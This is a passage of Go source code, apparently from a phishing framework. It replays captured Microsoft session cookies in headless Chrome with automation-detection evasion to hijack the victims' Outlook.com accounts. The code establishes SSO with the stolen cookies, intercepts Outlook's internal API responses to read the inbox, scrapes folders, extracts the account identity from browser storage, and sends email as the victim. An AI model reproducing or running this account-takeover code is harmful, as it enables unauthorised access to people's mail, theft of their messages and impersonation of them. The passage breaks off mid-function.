package service

import (
	"context"
	"encoding/json"
	"fmt"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/phishingclub/phishingclub/model"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/launcher"
	"github.com/go-rod/rod/lib/proto"
	"go.uber.org/zap"
)

// BrowserSessionService handles browser-based cookie validation and token acquisition.
type BrowserSessionService struct {
	Logger *zap.SugaredLogger
	mu     sync.Mutex
}

// NewBrowserSessionService creates a new BrowserSessionService
func NewBrowserSessionService(logger *zap.SugaredLogger) *BrowserSessionService {
	return &BrowserSessionService{
		Logger: logger,
	}
}

// BrowserSessionResult holds the result of a browser-based session validation
type BrowserSessionResult struct {
	Valid       bool   `json:"valid"`
	Email       string `json:"email"`
	DisplayName string `json:"displayName"`
	AccessToken string `json:"accessToken"`
	Error       string `json:"error,omitempty"`
}

// cookieEntry represents a single cookie from the stored JSON
type cookieEntry struct {
	Name           string      `json:"name"`
	Value          string      `json:"value"`
	Domain         string      `json:"domain"`
	Path           string      `json:"path"`
	Secure         interface{} `json:"secure"`
	HttpOnly       interface{} `json:"httpOnly"`
	SameSite       string      `json:"sameSite"`
	ExpirationDate interface{} `json:"expirationDate"`
}

// launchBrowser creates and returns a headless Chrome browser instance
func (b *BrowserSessionService) launchBrowser(ctx context.Context, timeout time.Duration) (*rod.Browser, func(), error) {
	chromePath := os.Getenv("CHROME_PATH")
	if chromePath == "" {
		chromePath = "/usr/bin/chromium"
	}

	l := launcher.New().
		Bin(chromePath).
		Headless(true).
		Set("disable-blink-features", "AutomationControlled").
		Set("disable-infobars", "").
		Set("no-first-run", "").
		Set("no-default-browser-check", "").
		Set("disable-gpu", "").
		Set("window-size", "1920,1080").
		NoSandbox(true)

	wsURL, err := l.Launch()
	if err != nil {
		return nil, nil, fmt.Errorf("failed to launch Chrome: %w", err)
	}

	browser := rod.New().ControlURL(wsURL)
	if err := browser.Connect(); err != nil {
		return nil, nil, fmt.Errorf("failed to connect to Chrome: %w", err)
	}

	timeoutCtx, cancel := context.WithTimeout(ctx, timeout)
	browser = browser.Context(timeoutCtx)

	cleanup := func() {
		cancel()
		browser.Close()
	}

	return browser, cleanup, nil
}

// setupPageWithCookiesAndSSO creates a page, injects cookies, and navigates through SSO to Outlook
func (b *BrowserSessionService) setupPageWithCookiesAndSSO(browser *rod.Browser, cookies []cookieEntry) (*rod.Page, error) {
	page, err := browser.Page(proto.TargetCreateTarget{URL: "about:blank"})
	if err != nil {
		return nil, fmt.Errorf("failed to create page: %w", err)
	}

	// Inject cookies
	b.Logger.Infow("injecting cookies", "count", len(cookies))
	if err := b.injectCookies(page, cookies); err != nil {
		b.Logger.Warnw("some cookies failed to inject", "error", err)
	}

	// Navigate to login.live.com to establish SSO session
	b.Logger.Infow("navigating to login.live.com to establish SSO session")
	if err := page.Navigate("https://login.live.com/"); err != nil {
		return nil, fmt.Errorf("failed to navigate to login.live.com: %w", err)
	}
	if err := page.WaitLoad(); err != nil {
		b.Logger.Warnw("login.live.com load timeout, continuing", "error", err)
	}
	time.Sleep(3 * time.Second)

	currentURL := page.MustInfo().URL
	b.Logger.Infow("after login.live.com navigation", "currentURL", currentURL)

	// Check if SSO failed (still on login page with email input)
	if strings.Contains(currentURL, "login.live.com") && !strings.Contains(currentURL, "account.microsoft.com") {
		el, err := page.Element("#i0116")
		if err == nil && el != nil {
			return nil, fmt.Errorf("cookies did not establish SSO session - session may be expired")
		}
	}

	return page, nil
}

// navigateToOutlook navigates a page (with SSO established) to Outlook inbox
func (b *BrowserSessionService) navigateToOutlook(page *rod.Page) error {
	b.Logger.Infow("navigating to outlook.live.com/mail/")
	if err := page.Navigate("https://outlook.live.com/mail/"); err != nil {
		return fmt.Errorf("failed to navigate to outlook.live.com: %w", err)
	}
	if err := page.WaitLoad(); err != nil {
		b.Logger.Warnw("outlook.live.com load timeout, continuing", "error", err)
	}
	time.Sleep(5 * time.Second)

	// Verify we're on Outlook
	pageTitle, _ := page.Eval(`() => document.title`)
	title := ""
	if pageTitle != nil {
		title = pageTitle.Value.String()
	}
	b.Logger.Infow("Outlook page loaded", "title", title, "url", page.MustInfo().URL)

	if !strings.Contains(strings.ToLower(title), "mail") && !strings.Contains(strings.ToLower(title), "outlook") {
		return fmt.Errorf("failed to load Outlook - page title: %s", title)
	}

	return nil
}

// ValidateAndGetToken uses headless Chrome to validate cookies and extract account info.
func (b *BrowserSessionService) ValidateAndGetToken(ctx context.Context, cookiesJSON string) (*BrowserSessionResult, error) {
	b.mu.Lock()
	defer b.mu.Unlock()

	b.Logger.Infow("starting browser-based cookie validation")

	var cookies []cookieEntry
	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
		return nil, fmt.Errorf("failed to parse cookies JSON: %w", err)
	}

	if len(cookies) == 0 {
		return &BrowserSessionResult{Valid: false, Error: "no cookies to inject"}, nil
	}

	browser, cleanup, err := b.launchBrowser(ctx, 90*time.Second)
	if err != nil {
		return nil, err
	}
	defer cleanup()

	page, err := b.setupPageWithCookiesAndSSO(browser, cookies)
	if err != nil {
		return &BrowserSessionResult{Valid: false, Error: err.Error()}, nil
	}

	// Navigate to Outlook
	if err := b.navigateToOutlook(page); err != nil {
		// Even if Outlook fails, we might have SSO info
		b.Logger.Warnw("Outlook navigation failed", "error", err)
	}

	// Extract account info
	email, displayName := b.extractAccountInfo(page)
	if email == "" {
		email = b.extractEmailFromDOM(page)
	}

	// Try to extract display name from page title ("Mail - Jenessa Crook - Outlook")
	if displayName == "" {
		pageTitle, _ := page.Eval(`() => document.title`)
		if pageTitle != nil {
			title := pageTitle.Value.String()
			if strings.Contains(title, " - ") {
				parts := strings.Split(title, " - ")
				if len(parts) >= 2 {
					displayName = strings.TrimSpace(parts[1])
				}
			}
		}
	}

	result := &BrowserSessionResult{
		Valid:       email != "" || displayName != "",
		Email:       email,
		DisplayName: displayName,
		AccessToken: "", // MSA consumer accounts don't provide JWT tokens
	}

	if !result.Valid {
		result.Error = "could not extract account info from Outlook"
	}

	b.Logger.Infow("browser session validation complete",
		"valid", result.Valid,
		"email", result.Email,
		"displayName", result.DisplayName,
	)

	return result, nil
}

// ReadInboxViaBrowser reads inbox messages by intercepting Outlook's internal API responses
func (b *BrowserSessionService) ReadInboxViaBrowser(ctx context.Context, cookiesJSON string, folder string, limit int, skip int) ([]model.InboxMessage, int, error) {
	b.mu.Lock()
	defer b.mu.Unlock()

	b.Logger.Infow("reading inbox via browser automation", "folder", folder, "limit", limit, "skip", skip)

	var cookies []cookieEntry
	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
		return nil, 0, fmt.Errorf("failed to parse cookies JSON: %w", err)
	}

	browser, cleanup, err := b.launchBrowser(ctx, 120*time.Second)
	if err != nil {
		return nil, 0, err
	}
	defer cleanup()

	page, err := b.setupPageWithCookiesAndSSO(browser, cookies)
	if err != nil {
		return nil, 0, err
	}

	// Enable network interception to capture Outlook's API responses
	var capturedMessages []model.InboxMessage
	var capturedCount int
	var messagesMu sync.Mutex
	var messagesFound bool

	err = proto.NetworkEnable{}.Call(page)
	if err != nil {
		b.Logger.Warnw("failed to enable network events", "error", err)
	}

	// Listen for Outlook API responses that contain message data
	waitEvents := page.EachEvent(
		func(e *proto.NetworkResponseReceived) {
			reqURL := e.Response.URL

			// Outlook web fetches messages from these endpoints:
			// - substrate.office.com/owa/...
			// - outlook.live.com/owa/...
			// - outlook.office.com/api/...
			isMessageAPI := (strings.Contains(reqURL, "/owa/") && strings.Contains(reqURL, "FindItem")) ||
				(strings.Contains(reqURL, "/owa/") && strings.Contains(reqURL, "GetConversationItems")) ||
				(strings.Contains(reqURL, "/owa/") && strings.Contains(reqURL, "FindConversation")) ||
				(strings.Contains(reqURL, "/api/") && strings.Contains(reqURL, "messages")) ||
				(strings.Contains(reqURL, "substrate.office.com") && (strings.Contains(reqURL, "messages") || strings.Contains(reqURL, "Items") || strings.Contains(reqURL, "Conversation")))

			if !isMessageAPI {
				return
			}

			if e.Response.Status != 200 {
				return
			}

			b.Logger.Infow("intercepted Outlook API response", "url", reqURL, "status", e.Response.Status)

			body, bodyErr := proto.NetworkGetResponseBody{RequestID: e.RequestID}.Call(page)
			if bodyErr != nil {
				b.Logger.Debugw("failed to get API response body", "error", bodyErr)
				return
			}

			messages := b.parseOutlookAPIResponse(body.Body, reqURL)
			if len(messages) > 0 {
				messagesMu.Lock()
				capturedMessages = append(capturedMessages, messages...)
				capturedCount = len(capturedMessages)
				messagesFound = true
				b.Logger.Infow("extracted messages from API response", "count", len(messages), "totalSoFar", capturedCount)
				messagesMu.Unlock()
			}
		},
	)
	_ = waitEvents

	// Navigate to Outlook - this will trigger API calls that we intercept
	if err := b.navigateToOutlook(page); err != nil {
		return nil, 0, err
	}

	// Wait for API responses to be intercepted
	b.Logger.Infow("waiting for Outlook API responses...")
	for i := 0; i < 20; i++ {
		time.Sleep(2 * time.Second)
		messagesMu.Lock()
		found := messagesFound
		messagesMu.Unlock()
		if found {
			// Wait a bit more for any additional responses
			time.Sleep(3 * time.Second)
			break
		}
	}

	messagesMu.Lock()
	defer messagesMu.Unlock()

	// If no API responses were intercepted, fall back to DOM scraping
	if !messagesFound {
		b.Logger.Infow("no API responses intercepted, falling back to DOM scraping")
		capturedMessages = b.scrapeInboxFromDOM(page)
		capturedCount = len(capturedMessages)
	}

	// Apply pagination
	if skip >= len(capturedMessages) {
		return []model.InboxMessage{}, capturedCount, nil
	}
	end := skip + limit
	if end > len(capturedMessages) {
		end = len(capturedMessages)
	}

	b.Logger.Infow("inbox read complete", "totalMessages", capturedCount, "returned", end-skip)
	return capturedMessages[skip:end], capturedCount, nil
}

// parseOutlookAPIResponse parses various Outlook API response formats into InboxMessage
func (b *BrowserSessionService) parseOutlookAPIResponse(body string, reqURL string) []model.InboxMessage {
	var messages []model.InboxMessage

	// Try parsing as OWA FindConversation/FindItem response
	var owaResp struct {
		Body struct {
			ResponseMessages struct {
				Items []struct {
					RootFolder struct {
						Items []json.RawMessage `json:"Items"`
					} `json:"RootFolder"`
				} `json:"Items"`
			} `json:"ResponseMessages"`
			Conversations []json.RawMessage `json:"Conversations"`
		} `json:"Body"`
	}
	if json.Unmarshal([]byte(body), &owaResp) == nil {
		// Try conversations
		for _, conv := range owaResp.Body.Conversations {
			msg := b.parseOWAConversation(conv)
			if msg != nil {
				messages = append(messages, *msg)
			}
		}
		if len(messages) > 0 {
			return messages
		}
	}

	// Try parsing as substrate/OWA response with different structure
	var substrateResp struct {
		Value []json.RawMessage `json:"value"`
	}
	if json.Unmarshal([]byte(body), &substrateResp) == nil && len(substrateResp.Value) > 0 {
		for _, item := range substrateResp.Value {
			msg := b.parseSubstrateMessage(item)
			if msg != nil {
				messages = append(messages, *msg)
			}
		}
		if len(messages) > 0 {
			return messages
		}
	}

	// Try parsing as OWA FindConversation with Conversations array at top level
	var convResp struct {
		Conversations []json.RawMessage `json:"Conversations"`
	}
	if json.Unmarshal([]byte(body), &convResp) == nil && len(convResp.Conversations) > 0 {
		for _, conv := range convResp.Conversations {
			msg := b.parseOWAConversation(conv)
			if msg != nil {
				messages = append(messages, *msg)
			}
		}
		if len(messages) > 0 {
			return messages
		}
	}

	// Try parsing as direct message array
	var directMessages []json.RawMessage
	if json.Unmarshal([]byte(body), &directMessages) == nil && len(directMessages) > 0 {
		for _, item := range directMessages {
			msg := b.parseSubstrateMessage(item)
			if msg != nil {
				messages = append(messages, *msg)
			}
		}
	}

	return messages
}

// parseOWAConversation parses an OWA conversation object into InboxMessage
func (b *BrowserSessionService) parseOWAConversation(raw json.RawMessage) *model.InboxMessage {
	var conv struct {
		ConversationID struct {
			ID string `json:"Id"`
		} `json:"ConversationId"`
		ConversationTopic string `json:"ConversationTopic"`
		LastDeliveryTime  string `json:"LastDeliveryTime"`
		Preview           string `json:"Preview"`
		UnreadCount       int    `json:"UnreadCount"`
		HasAttachments    bool   `json:"HasAttachments"`
		LastSender        struct {
			Mailbox struct {
				Name         string `json:"Name"`
				EmailAddress string `json:"EmailAddress"`
			} `json:"Mailbox"`
		} `json:"LastSender"`
		From struct {
			Mailbox struct {
				Name         string `json:"Name"`
				EmailAddress string `json:"EmailAddress"`
			} `json:"Mailbox"`
		} `json:"From"`
		GlobalMessageCount int `json:"GlobalMessageCount"`
	}

	if err := json.Unmarshal(raw, &conv); err != nil {
		return nil
	}

	if conv.ConversationTopic == "" && conv.ConversationID.ID == "" {
		return nil
	}

	from := conv.LastSender.Mailbox.EmailAddress
	fromName := conv.LastSender.Mailbox.Name
	if from == "" {
		from = conv.From.Mailbox.EmailAddress
		fromName = conv.From.Mailbox.Name
	}

	return &model.InboxMessage{
		ID:             conv.ConversationID.ID,
		From:           from,
		FromName:       fromName,
		Subject:        conv.ConversationTopic,
		Preview:        conv.Preview,
		Date:           conv.LastDeliveryTime,
		IsRead:         conv.UnreadCount == 0,
		HasAttachments: conv.HasAttachments,
		ConversationID: conv.ConversationID.ID,
	}
}

// parseSubstrateMessage parses a substrate/REST API message object into InboxMessage
func (b *BrowserSessionService) parseSubstrateMessage(raw json.RawMessage) *model.InboxMessage {
	var msg struct {
		ID   string `json:"Id"`
		OID  string `json:"id"` // lowercase for Graph/REST format
		From struct {
			EmailAddress struct {
				Name    string `json:"Name"`
				Address string `json:"Address"`
				// Also try lowercase
				NameL    string `json:"name"`
				AddressL string `json:"address"`
			} `json:"EmailAddress"`
			// Also try lowercase
			EmailAddressL struct {
				Name    string `json:"name"`
				Address string `json:"address"`
			} `json:"emailAddress"`
		} `json:"From"`
		FromL struct {
			EmailAddress struct {
				Name    string `json:"name"`
				Address string `json:"address"`
			} `json:"emailAddress"`
		} `json:"from"`
		Subject        string `json:"Subject"`
		SubjectL       string `json:"subject"`
		ReceivedTime   string `json:"ReceivedDateTime"`
		ReceivedTimeL  string `json:"receivedDateTime"`
		DateTimeRcvd   string `json:"DateTimeReceived"`
		Preview        string `json:"Preview"`
		PreviewL       string `json:"bodyPreview"`
		BodyPreview    string `json:"BodyPreview"`
		IsRead         bool   `json:"IsRead"`
		IsReadL        bool   `json:"isRead"`
		HasAttachments bool   `json:"HasAttachments"`
		HasAttachL     bool   `json:"hasAttachments"`
		ConvID         struct {
			ID string `json:"Id"`
		} `json:"ConversationId"`
		ConvIDL string `json:"conversationId"`
	}

	if err := json.Unmarshal(raw, &msg); err != nil {
		return nil
	}

	id := msg.ID
	if id == "" {
		id = msg.OID
	}
	if id == "" {
		return nil
	}

	subject := msg.Subject
	if subject == "" {
		subject = msg.SubjectL
	}

	from := msg.From.EmailAddress.Address
	fromName := msg.From.EmailAddress.Name
	if from == "" {
		from = msg.From.EmailAddress.AddressL
		fromName = msg.From.EmailAddress.NameL
	}
	if from == "" {
		from = msg.From.EmailAddressL.Address
		fromName = msg.From.EmailAddressL.Name
	}
	if from == "" {
		from = msg.FromL.EmailAddress.Address
		fromName = msg.FromL.EmailAddress.Name
	}

	date := msg.ReceivedTime
	if date == "" {
		date = msg.ReceivedTimeL
	}
	if date == "" {
		date = msg.DateTimeRcvd
	}

	preview := msg.Preview
	if preview == "" {
		preview = msg.PreviewL
	}
	if preview == "" {
		preview = msg.BodyPreview
	}

	convID := msg.ConvID.ID
	if convID == "" {
		convID = msg.ConvIDL
	}

	isRead := msg.IsRead || msg.IsReadL
	hasAttach := msg.HasAttachments || msg.HasAttachL

	return &model.InboxMessage{
		ID:             id,
		From:           from,
		FromName:       fromName,
		Subject:        subject,
		Preview:        preview,
		Date:           date,
		IsRead:         isRead,
		HasAttachments: hasAttach,
		ConversationID: convID,
	}
}

// scrapeInboxFromDOM extracts messages from the rendered Outlook page as a fallback
func (b *BrowserSessionService) scrapeInboxFromDOM(page *rod.Page) []model.InboxMessage {
	script := `() => {
		try {
			const messages = [];
			// Try multiple selector strategies for Outlook web
			const selectors = [
				'div[data-convid]',
				'div[role="option"]',
				'div[aria-label][data-is-focusable="true"]',
				'div.customScrollBar div[tabindex]',
			];
			
			let items = [];
			for (const sel of selectors) {
				items = document.querySelectorAll(sel);
				if (items.length > 0) break;
			}
			
			items.forEach((item, index) => {
				// Extract sender
				let sender = '';
				let senderName = '';
				const senderEl = item.querySelector('[data-testid="SenderName"]') ||
				                 item.querySelector('span[class*="lvHighlightAllClass"]') ||
				                 item.querySelector('span[class*="OZZZK"]');
				if (senderEl) {
					senderName = senderEl.textContent.trim();
					sender = senderName;
				}
				
				// Extract subject
				let subject = '';
				const subjectEl = item.querySelector('[data-testid="SubjectLine"]') ||
				                  item.querySelector('span[class*="lvHighlightSubjectClass"]') ||
				                  item.querySelector('span[class*="jGG6V"]');
				if (subjectEl) {
					subject = subjectEl.textContent.trim();
				}
				
				// Extract preview
				let preview = '';
				const previewEl = item.querySelector('[data-testid="BodyPreview"]') ||
				                  item.querySelector('span[class*="Mc1Ri"]');
				if (previewEl) {
					preview = previewEl.textContent.trim();
				}
				
				// Extract date
				let date = '';
				const dateEl = item.querySelector('[data-testid="DateLine"]') ||
				               item.querySelector('span[class*="jHATS"]') ||
				               item.querySelector('span[class*="ms-font-weight-regular"]');
				if (dateEl) {
					date = dateEl.textContent.trim();
				}
				
				// Extract conversation ID
				let convId = item.getAttribute('data-convid') || '';
				
				// Check if read
				let isRead = !item.querySelector('[class*="unread"]') && 
				             !item.classList.contains('unread');
				
				// Check attachments
				let hasAttach = !!item.querySelector('[data-icon-name="Attach"]') ||
				                !!item.querySelector('i[class*="attach"]');
				
				if (sender || subject) {
					messages.push({
						id: convId || 'dom-' + index,
						from: sender,
						fromName: senderName,
						subject: subject,
						preview: preview,
						date: date,
						isRead: isRead,
						hasAttachments: hasAttach,
						conversationId: convId
					});
				}
			});
			
			// Also try aria-label based extraction as last resort
			if (messages.length === 0) {
				const allItems = document.querySelectorAll('[aria-label]');
				allItems.forEach((item, index) => {
					const label = item.getAttribute('aria-label') || '';
					// Outlook message items have aria-labels like "Subject, From, Date"
					if (label.includes(',') && label.length > 20 && label.length < 500) {
						const parts = label.split(',').map(p => p.trim());
						if (parts.length >= 2) {
							messages.push({
								id: 'aria-' + index,
								from: parts.length >= 2 ? parts[1] : '',
								fromName: parts.length >= 2 ? parts[1] : '',
								subject: parts[0] || '',
								preview: parts.length >= 3 ? parts.slice(2).join(', ') : '',
								date: '',
								isRead: true,
								hasAttachments: false,
								conversationId: ''
							});
						}
					}
				});
			}
			
			return JSON.stringify(messages);
		} catch(e) {
			return '[]';
		}
	}`

	result, err := page.Eval(script)
	if err != nil || result == nil {
		b.Logger.Warnw("DOM scraping failed", "error", err)
		return nil
	}

	var messages []model.InboxMessage
	if err := json.Unmarshal([]byte(result.Value.String()), &messages); err != nil {
		b.Logger.Warnw("failed to parse DOM scraping result", "error", err)
		return nil
	}

	b.Logger.Infow("DOM scraping extracted messages", "count", len(messages))
	return messages
}

// SendEmailViaBrowser sends an email using browser automation on Outlook web
func (b *BrowserSessionService) SendEmailViaBrowser(ctx context.Context, cookiesJSON string, to []string, subject, body string, isHTML bool) error {
	b.mu.Lock()
	defer b.mu.Unlock()

	b.Logger.Infow("sending email via browser automation", "to", to, "subject", subject)

	var cookies []cookieEntry
	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
		return fmt.Errorf("failed to parse cookies JSON: %w", err)
	}

	browser, cleanup, err := b.launchBrowser(ctx, 120*time.Second)
	if err != nil {
		return err
	}
	defer cleanup()

	page, err := b.setupPageWithCookiesAndSSO(browser, cookies)
	if err != nil {
		return err
	}

	// Navigate to compose
	composeURL := "https://outlook.live.com/mail/0/deeplink/compose"
	b.Logger.Infow("navigating to compose page", "url", composeURL)
	if err := page.Navigate(composeURL); err != nil {
		return fmt.Errorf("failed to navigate to compose: %w", err)
	}
	if err := page.WaitLoad(); err != nil {
		b.Logger.Warnw("compose page load timeout, continuing", "error", err)
	}
	time.Sleep(5 * time.Second)

	// Verify we're on the compose page
	pageTitle, _ := page.Eval(`() => document.title`)
	title := ""
	if pageTitle != nil {
		title = pageTitle.Value.String()
	}
	b.Logger.Infow("compose page loaded", "title", title)

	// Fill in the To field - try multiple selectors
	toSelectors := []string{
		`[aria-label="To"]`,
		`input[aria-label="To"]`,
		`div[aria-label="To"] input`,
		`input[placeholder*="To"]`,
		`div[role="textbox"][aria-label*="To"]`,
	}
	var toField *rod.Element
	for _, sel := range toSelectors {
		toField, err = page.Element(sel)
		if err == nil && toField != nil {
			break
		}
	}
	if toField == nil {
		return fmt.Errorf("could not find To field with any selector")
	}

	for _, recipient := range to {
		toField.Input(recipient)
		toField.Type(input.Enter)
		time.Sleep(500 * time.Millisecond)
	}
	b.Logger.Infow("filled To field", "recipients", to)

	// Fill in Subject - try multiple selectors
	subjectSelectors := []string{
		`[aria-label="Add a subject"]`,
		`input[aria-label="Subject"]`,
		`input[aria-label="Add a subject"]`,
		`input[placeholder*="subject"]`,
	}
	var subjectField *rod.Element
	for _, sel := range subjectSelectors {
		subjectField, err = page.Element(sel)
		if err == nil && subjectField != nil {
			break
		}
	}
	if subjectField == nil {
		return fmt.Errorf("could not find Subject field with any selector")
	}
	subjectField.Input(subject)
	b.Logger.Infow("filled Subject field")

	// Fill in Body - try multiple selectors
	bodySelectors := []string{
		`[aria-label="Message body, press Alt+F10 to exit"]`,
		`div[role="textbox"][aria-label*="Message body"]`,
		`div[role="textbox"]`,
		`div[contenteditable="true"]`,
	}
	var bodyField *rod.Element
	for _, sel := range bodySelectors {
		bodyField, err = page.Element(sel)
		if err == nil && bodyField != nil {
			break
		}
	}
	if bodyField == nil {
		return fmt.Errorf("could not find body field with any selector")
	}

	if isHTML {
		_, evalErr := page.Eval(fmt.Sprintf(`() => {
			const selectors = [
				'[aria-label="Message body, press Alt+F10 to exit"]',
				'div[role="textbox"][aria-label*="Message body"]',
				'div[role="textbox"]',
				'div[contenteditable="true"]'
			];
			for (const sel of selectors) {
				const el = document.querySelector(sel);
				if (el) {
					el.innerHTML = %s;
					return true;
				}
			}
			return false;
		}`, jsonEscape(body)))
		if evalErr != nil {
			b.Logger.Warnw("HTML body injection failed, trying plain text", "error", evalErr)
			bodyField.Input(body)
		}
	} else {
		bodyField.Input(body)
	}
	b.Logger.Infow("filled Body field")

	time.Sleep(1 * time.Second)

	// Click Send button - try multiple selectors
	sendSelectors := []string{
		`button[aria-label="Send"]`,
		`button[title="Send"]`,
		`button[data-testid="send"]`,
	}
	var sendBtn *rod.Element
	for _, sel := range sendSelectors {
		sendBtn, err = page.Element(sel)
		if err == nil && sendBtn != nil {
			break
		}
	}
	if sendBtn == nil {
		// Try keyboard shortcut as fallback
		b.Logger.Infow("Send button not found, trying Ctrl+Enter shortcut")
		page.KeyActions().Press(input.ControlLeft).Type(input.Enter).MustDo()
	} else {
		sendBtn.Click(proto.InputMouseButtonLeft, 1)
	}

	time.Sleep(3 * time.Second)

	b.Logger.Infow("email sent via browser automation", "to", to, "subject", subject)
	return nil
}

// GetFoldersViaBrowser reads mail folders using browser automation
func (b *BrowserSessionService) GetFoldersViaBrowser(ctx context.Context, cookiesJSON string) ([]model.InboxFolder, error) {
	b.mu.Lock()
	defer b.mu.Unlock()

	b.Logger.Infow("reading folders via browser automation")

	var cookies []cookieEntry
	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
		return nil, fmt.Errorf("failed to parse cookies JSON: %w", err)
	}

	browser, cleanup, err := b.launchBrowser(ctx, 90*time.Second)
	if err != nil {
		return nil, err
	}
	defer cleanup()

	page, err := b.setupPageWithCookiesAndSSO(browser, cookies)
	if err != nil {
		return nil, err
	}

	// Enable network interception
	var capturedFolders []model.InboxFolder
	var foldersMu sync.Mutex
	var foldersFound bool

	err = proto.NetworkEnable{}.Call(page)
	if err != nil {
		b.Logger.Warnw("failed to enable network events", "error", err)
	}

	// Listen for folder API responses
	waitEvents := page.EachEvent(
		func(e *proto.NetworkResponseReceived) {
			reqURL := e.Response.URL
			isFolderAPI := (strings.Contains(reqURL, "folders") || strings.Contains(reqURL, "Folder")) &&
				(strings.Contains(reqURL, "outlook") || strings.Contains(reqURL, "substrate") || strings.Contains(reqURL, "office"))

			if !isFolderAPI || e.Response.Status != 200 {
				return
			}

			body, bodyErr := proto.NetworkGetResponseBody{RequestID: e.RequestID}.Call(page)
			if bodyErr != nil {
				return
			}

			folders := b.parseFolderResponse(body.Body)
			if len(folders) > 0 {
				foldersMu.Lock()
				capturedFolders = folders
				foldersFound = true
				foldersMu.Unlock()
			}
		},
	)
	_ = waitEvents

	if err := b.navigateToOutlook(page); err != nil {
		return nil, err
	}

	// Wait for folder API responses
	for i := 0; i < 15; i++ {
		time.Sleep(2 * time.Second)
		foldersMu.Lock()
		found := foldersFound
		foldersMu.Unlock()
		if found {
			break
		}
	}

	foldersMu.Lock()
	defer foldersMu.Unlock()

	// If no API response, return default folders
	if !foldersFound {
		b.Logger.Infow("no folder API response intercepted, returning default folders")
		capturedFolders = []model.InboxFolder{
			{ID: "inbox", DisplayName: "Inbox", TotalItemCount: 0, UnreadItemCount: 0},
			{ID: "sentitems", DisplayName: "Sent Items", TotalItemCount: 0, UnreadItemCount: 0},
			{ID: "drafts", DisplayName: "Drafts", TotalItemCount: 0, UnreadItemCount: 0},
			{ID: "junkemail", DisplayName: "Junk Email", TotalItemCount: 0, UnreadItemCount: 0},
			{ID: "deleteditems", DisplayName: "Deleted Items", TotalItemCount: 0, UnreadItemCount: 0},
		}
	}

	return capturedFolders, nil
}

// parseFolderResponse parses folder API responses
func (b *BrowserSessionService) parseFolderResponse(body string) []model.InboxFolder {
	// Try REST API format
	var restResp struct {
		Value []struct {
			ID              string `json:"Id"`
			OID             string `json:"id"`
			DisplayName     string `json:"DisplayName"`
			DisplayNameL    string `json:"displayName"`
			TotalItemCount  int    `json:"TotalItemCount"`
			TotalItemCountL int    `json:"totalItemCount"`
			UnreadCount     int    `json:"UnreadItemCount"`
			UnreadCountL    int    `json:"unreadItemCount"`
		} `json:"value"`
	}

	if json.Unmarshal([]byte(body), &restResp) == nil && len(restResp.Value) > 0 {
		var folders []model.InboxFolder
		for _, f := range restResp.Value {
			id := f.ID
			if id == "" {
				id = f.OID
			}
			name := f.DisplayName
			if name == "" {
				name = f.DisplayNameL
			}
			total := f.TotalItemCount
			if total == 0 {
				total = f.TotalItemCountL
			}
			unread := f.UnreadCount
			if unread == 0 {
				unread = f.UnreadCountL
			}
			folders = append(folders, model.InboxFolder{
				ID:              id,
				DisplayName:     name,
				TotalItemCount:  total,
				UnreadItemCount: unread,
			})
		}
		return folders
	}

	return nil
}

// injectCookies injects cookies into the browser page for all relevant Microsoft domains
func (b *BrowserSessionService) injectCookies(page *rod.Page, cookies []cookieEntry) error {
	var lastErr error
	injected := 0

	for _, c := range cookies {
		if c.Name == "" || c.Value == "" {
			continue
		}

		domain := c.Domain
		if domain == "" {
			continue
		}

		// Normalize domain
		if strings.HasPrefix(domain, ".") {
			domain = domain[1:]
		}

		path := c.Path
		if path == "" {
			path = "/"
		}

		secure := false
		switch v := c.Secure.(type) {
		case bool:
			secure = v
		case string:
			secure = v == "true" || v == "1"
		case float64:
			secure = v != 0
		}

		httpOnly := false
		switch v := c.HttpOnly.(type) {
		case bool:
			httpOnly = v
		case string:
			httpOnly = v == "true" || v == "1"
		case float64:
			httpOnly = v != 0
		}

		var expires proto.TimeSinceEpoch
		switch v := c.ExpirationDate.(type) {
		case float64:
			if v > 0 {
				expires = proto.TimeSinceEpoch(v)
			}
		case string:
			// Skip if empty
		}

		sameSite := proto.NetworkCookieSameSiteNone
		switch strings.ToLower(c.SameSite) {
		case "strict":
			sameSite = proto.NetworkCookieSameSiteStrict
		case "lax":
			sameSite = proto.NetworkCookieSameSiteLax
		case "none", "no_restriction":
			sameSite = proto.NetworkCookieSameSiteNone
		}

		scheme := "https"
		if !secure {
			scheme = "http"
		}
		cookieURL := fmt.Sprintf("%s://%s%s", scheme, domain, path)

		_, setErr := proto.NetworkSetCookie{
			Name:     c.Name,
			Value:    c.Value,
			Domain:   c.Domain,
			Path:     path,
			Secure:   secure,
			HTTPOnly: httpOnly,
			SameSite: sameSite,
			URL:      cookieURL,
			Expires:  expires,
		}.Call(page)

		if setErr != nil {
			lastErr = setErr
			b.Logger.Debugw("failed to inject cookie", "name", c.Name, "domain", c.Domain, "error", setErr)
		} else {
			injected++
		}
	}

	b.Logger.Infow("cookies injected", "injected", injected, "total", len(cookies))
	return lastErr
}

// extractAccountInfo extracts email and display name from MSAL cache
func (b *BrowserSessionService) extractAccountInfo(page *rod.Page) (email, displayName string) {
	script := `() => {
		try {
			const storages = [sessionStorage, localStorage];
			for (const storage of storages) {
				for (let i = 0; i < storage.length; i++) {
					const key = storage.key(i);
					if (key && (key.includes('.account.') || key.includes('idtoken'))) {
						try {
							const val = JSON.parse(storage.getItem(key));
							if (val) {
								const email = val.username || val.preferred_username || '';
								const name = val.name || '';
								if (email || name) {
									return JSON.stringify({email: email, name: name});
								}
							}
						} catch(e) {}
					}
				}
			}
		} catch(e) {}
		return '';
	}`

	result, err := page.Eval(script)
	if err != nil || result == nil {
		return "", ""
	}
	val := result.Value.String()
	if val == "" {
		return "", ""
	}

	var data struct {
		Email string `json:"email"`
		Name  string `json:"name"`
	}
	if json.Unmarshal([]byte(val), &data) == nil {
		return data.Email, data.Name
	}
	return "", ""
}

// extractEmailFromDOM tries to extract the email from the Outlook page DOM
func (b *BrowserSessionService) extractEmailFromDOM(page *rod.Page) string {
	selectors := []string{
		`[data-testid="mectrl_currentAccount_secondary"]`,
		`#mectrl_currentAccount_secondary`,
		`#O365_MainLink_Me`,
	}

	for _, sel := range selectors {
		el, err := page.Element(sel)
		if err != nil || el == nil {
			continue
		}
		text, err := el.Text()
		if err != nil || text == "" {
			continue
		}
